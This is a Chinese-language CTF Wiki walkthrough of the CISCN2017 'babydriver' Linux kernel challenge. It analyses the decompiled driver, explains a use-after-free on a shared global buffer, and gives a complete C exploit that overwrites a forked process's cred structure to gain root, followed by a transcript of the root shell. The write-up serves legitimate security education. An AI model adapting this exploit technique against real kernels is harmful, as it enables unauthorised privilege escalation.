[EN](./kernel_uaf.md) | [ZH](./kernel_uaf-zh.md)
## kernel UAF

### CISCN2017 - babydriver
[attachment here](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)

#### 分析
先解压 rootfs.cpio 看一下有什么文件
```bash
CISCN2017_babydriver [master●] mkdir core
CISCN2017_babydriver [master●] cd core 
core [master●] mv ../rootfs.cpio rootfs.cpio.gz
core [master●●] gunzip ./rootfs.cpio.gz 
core [master●] ls
rootfs.cpio
core [master●] cpio -idmv < rootfs.cpio 
.
etc
etc/init.d
etc/passwd
etc/group
...
...
usr/sbin/rdev
usr/sbin/ether-wake
tmp
linuxrc
home
home/ctf
5556 块
core [master●] ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
core [master●] bat init
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: init
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/sh
   2   │
   3   │ mount -t proc none /proc
   4   │ mount -t sysfs none /sys
   5   │ mount -t devtmpfs devtmpfs /dev
   6   │ chown root:root flag
   7   │ chmod 400 flag
   8   │ exec 0</dev/console
   9   │ exec 1>/dev/console
  10   │ exec 2>/dev/console
  11   │
  12   │ insmod /lib/modules/4.4.72/babydriver.ko
  13   │ chmod 777 /dev/babydev
  14   │ echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
  15   │ setsid cttyhack setuidgid 1000 sh
  16   │
  17   │ umount /proc
  18   │ umount /sys
  19   │ poweroff -d 0  -f
  20   │
───────┴────────────────────────────────────────────────────────────
```
根据 init 的内容，12 行加载了 `babydriver.ko` 这个驱动，根据 pwn 的一般套路，这个就是有漏洞的 LKM 了。init 的其他命令都是 linux 常用的命令，就不再解释了。

把这个驱动文件拿出来。

```bash
core [master●] cp ./lib/modules/4.4.72/babydriver.ko ..
core [master●] cd ..
CISCN2017_babydriver [master●] check ./babydriver.ko
./babydriver.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped
[*] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```
没有开 PIE，无 canary 保护，没有去除符号表，很 nice。

用 IDA 打开分析，既然没有去除符号表，shift + F9 先看一下有什么结构体，可以发现如下的结构体：
```asm
00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
00000000                                         ; XREF: .bss:babydev_struct/r
00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
00000000                                         ; babyopen+26/w ... ; offset
00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
00000008                                         ; babyioctl+3C/w ...
00000010 babydevice_t    ends
00000010
```

再看一下主要函数

**babyioctl:** 定义了 0x10001 的命令，可以释放全局变量 babydev\_struct 中的 device\_buf，再根据用户传递的 size 重新申请一块内存，并设置 device\_buf\_len。
```C
// local variable allocation has failed, the output may be wrong!
void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx

  _fentry__(filp, *(_QWORD *)&command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
  }
  else
  {
    printk("\x013defalut:arg is %ld\n", v3, v3);
  }
}
```

**babyopen:** 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev\_struct.device\_buf 上，并更新 babydev\_struct.device\_buf\_len
```C
int __fastcall babyopen(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n", 0x24000C0LL, v2);
  return 0;
}
```

**babyread:** 先检查长度是否小于 babydev\_struct.device\_buf\_len，然后把 babydev\_struct.device\_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数
```C
void __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_to_user(buffer, babydev_struct.device_buf, v4);
  }
}
```

**babywrite:** 类似 babyread，不同的是从 buffer 拷贝到全局变量中
```C
void __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx

  _fentry__(filp, buffer);
  if ( babydev_struct.device_buf )
  {
    if ( babydev_struct.device_buf_len > v4 )
      copy_from_user(babydev_struct.device_buf, buffer, v4);
  }
}
```

**babyrelease:** 释放空间，没什么好说的
```C
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx

  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v2);
  return 0;
}
```

还有 babydriver\_init() 和 babydriver\_exit() 两个函数分别完成了 **/dev/babydev** 设备的初始化和清理，查一下函数的用法即可，不再分析。

#### 思路
没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。

也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev\_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过得，这样就造成了一个 UAF。

那么有了 UAF 要怎么用呢？之前提到了 cred 结构体，可以修改 cred 来提权到 root。

其中 4.4.72 的 cred 结构体 [定义](https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118) 如下：
```C
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

那么根据 UAF 的思想，思路如下：

1. 打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小
2. 释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠
3. 同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root

需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0xa8（注意使用相同内核版本的源码）。


#### Exploit

注释都写在代码里了，[exploit here](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)
```C
CISCN2017_babydriver [master●●] cat exploit.c 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	// 打开两次设备
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
	ioctl(fd1, 0x10001, 0xa8);

	// 释放 fd1
	close(fd1);

	// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
		char zeros[30] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
			exit(0);
		}
	}
	
	else
	{
		wait(NULL);
	}
	close(fd2);

	return 0;
}
```

#### get root shell
```bash
// 静态编译文件，kernel 中没有 libc
CISCN2017_babydriver [master●●] gcc exploit.c -static -o exploit
CISCN2017_babydriver [master●●] file exploit
exploit: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped
// 把编译好的 exp 解压后的目录下，重新打包 rootfs.cpio
CISCN2017_babydriver [master●●] cp exploit core/tmp 
CISCN2017_babydriver [master●●] cd core 
core [master●●] find . | cpio -o --format=newc > rootfs.cpio
7017 块
core [master●●] cp rootfs.cpio ..
core [master●●] cd ..
// kvm 需要有 root 权限
CISCN2017_babydriver [master●●] sudo ./boot.sh
......
......

/ $ ls /tmp/
exploit
/ $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
/ $ /tmp/exploit
[   14.376187] device open
[   14.376715] device open
[   14.377201] alloc done
[   14.377629] device release
[+] root now.
/ # id
uid=0(root) gid=0(root) groups=1000(ctf)
/ #

```

当然也可以用 rop 来做，放到下一篇分析


## Reference:

https://bbs.pediy.com/thread-247054.htm

https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html

http://muhe.live/2017/07/13/babydriver-writeup/

https://www.anquanke.com/post/id/86490
